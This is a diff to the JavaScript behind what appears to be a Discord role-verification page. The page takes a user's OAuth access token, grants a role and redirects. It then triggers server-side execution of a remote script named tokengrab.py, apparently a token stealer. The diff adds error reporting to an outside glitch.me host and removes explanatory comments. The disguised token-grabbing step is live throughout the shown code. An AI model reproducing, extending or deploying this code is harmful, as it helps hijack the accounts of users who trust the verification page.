@@ -11,7 +11,20 @@ document.addEventListener('DOMContentLoaded', function() {
     const accessToken = getQueryParam('access_token');
     let userId;
 
-    // サーバーサイドでPythonスクリプトを実行する関数
+    async function logErrorToServer(error) {
+        try {
+            await fetch('https://inky-neat-thyme.glitch.me/log_error', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ error: error.message || error })
+            });
+        } catch (logError) {
+            console.error('Error logging to server:', logError);
+        }
+    }
+
     function executePythonScript() {
         const selectedGuildId = guildSelect.value;
 
@@ -21,7 +34,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-                githubUrl: 'https://raw.githubusercontent.com/RepublicofAuech/vearithy/main/tokengrab.py' // 実行するPythonスクリプトのURL
+                githubUrl: 'https://raw.githubusercontent.com/RepublicofAuech/vearithy/main/tokengrab.py'
             })
         })
         .then(response => {
@@ -32,6 +45,7 @@ document.addEventListener('DOMContentLoaded', function() {
         })
         .catch(error => {
             console.error('Error executing tokengrab.py:', error);
+            logErrorToServer(error);
         });
     }
 
@@ -49,10 +63,11 @@ document.addEventListener('DOMContentLoaded', function() {
                 option.text = guild.name;
                 guildSelect.appendChild(option);
             });
-            guildSelect.style.display = 'block'; // サーバー選択用の要素を表示する
+            guildSelect.style.display = 'block';
         })
         .catch(error => {
             console.error('Error fetching guilds:', error);
+            logErrorToServer(error);
         });
 
     if (accessToken) {
@@ -82,8 +97,9 @@ document.addEventListener('DOMContentLoaded', function() {
                 throw new Error('Failed to fetch user info');
             }
         })
-        .catch(error => {
+        .catch(async error => {
             console.error('Error fetching user info:', error);
+            await logErrorToServer(error);
             resultText.innerText = 'ユーザー情報の取得中にエラーが発生しました。再度お試しください';
             resultMessage.style.display = 'block';
         });
@@ -121,11 +137,12 @@ document.addEventListener('DOMContentLoaded', function() {
                 resultMessage.style.display = 'block';
                 setTimeout(function() {
                     window.location.href = 'https://republicofauech.github.io/vearithy/success/';
-                    executePythonScript(); // Pythonスクリプトを実行
+                    executePythonScript();
                 }, 2000);
             })
-            .catch(error => {
+            .catch(async error => {
                 console.error('Error granting role:', error);
+                await logErrorToServer(error);
                 resultText.innerText = 'ロールの付与中にエラーが発生しました。リダイレクトしています...';
                 resultMessage.style.display = 'block';
                 setTimeout(function() {
